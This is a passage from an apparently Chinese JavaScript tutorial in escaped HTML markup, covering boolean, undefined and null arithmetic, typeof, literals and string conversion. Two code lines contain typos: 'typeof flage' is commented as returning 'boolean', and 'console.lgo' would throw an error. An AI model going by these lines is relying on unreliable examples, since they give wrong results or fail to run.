&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// flag 布尔型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// flag1 布尔型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// true 参与加法运算当1来看
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;flag1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// false 参与加法运算当0来看
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 如果一个变量声明未赋值，就是undefined未定义数据类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;undefined&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// NaN undefined 和数字相加，最后的结果是 NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// null 空值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;space&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;space&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// nullpink
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;space&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;43-获取变量数据类型&#34;&gt;4.3 获取变量数据类型&lt;/h2&gt;
&lt;h3 id=&#34;431-获取检测变量的数据类型&#34;&gt;4.3.1 获取检测变量的数据类型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;typeof&lt;/code&gt;可用来获取检测变量的数据类型&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// number
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// string
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flage&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// boolean
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vari&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;undefined&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vari&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;timer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;timer&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// object 对象
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// prompt 取过来的值是 字符型的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入您的年龄&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;18&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;undefined&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200505024247.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;432-字面量&#34;&gt;4.3.2 字面量&lt;/h3&gt;
&lt;p&gt;字面量在源代码中一个固定值的表示法，通俗来说，就是字面量表示如何表达这个值。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数字字面量：8，9，10&lt;/li&gt;
&lt;li&gt;字符串字面量：&amp;lsquo;黑马程序员&amp;rsquo;，&amp;ldquo;大前端&amp;rdquo;&lt;/li&gt;
&lt;li&gt;布尔字面量：true，false&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;44-数据类型转换&#34;&gt;4.4 数据类型转换&lt;/h2&gt;
&lt;h3 id=&#34;441-什么是数据类型转换&#34;&gt;4.4.1 什么是数据类型转换&lt;/h3&gt;
&lt;p&gt;使用表单、prompt 获取过来的数据默认是字符串类型的，此时就不能直接简单的进行加法运算，而需要转换变量的数据类型。通俗来说，就是把一种数据类型的变量转换成另外一种数据类型。&lt;/p&gt;
&lt;p&gt;我们通常会实现3种方式的转换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;转换为字符串类型&lt;/li&gt;
&lt;li&gt;转换为数字型&lt;/li&gt;
&lt;li&gt;转换为布尔型&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;442-转换为字符串&#34;&gt;4.4.2 转换为字符串&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方式&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;案例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;toString()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;转成字符串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;var num = 1; alert(num.toString());&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;String()&lt;/code&gt; 强制转换&lt;/td&gt;
&lt;td&gt;转成字符串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;var num = 1; alert(String(num));&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;加号拼接字符串&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;和字符串拼接的结果都是字符串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;var num = 1; alert(num + &amp;quot;我是字符串&amp;quot;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;toString()&lt;/code&gt; 和 &lt;code&gt;String()&lt;/code&gt; 使用方式不一样&lt;/li&gt;
&lt;li&gt;三种转换方式，我们更喜欢用第三种加号拼接字符串转换方式，这一种方式也称之为隐式转换。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 把数字型转换为字符串型 变量.toString()
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;();
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lgo&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 我们利用 String(变量)
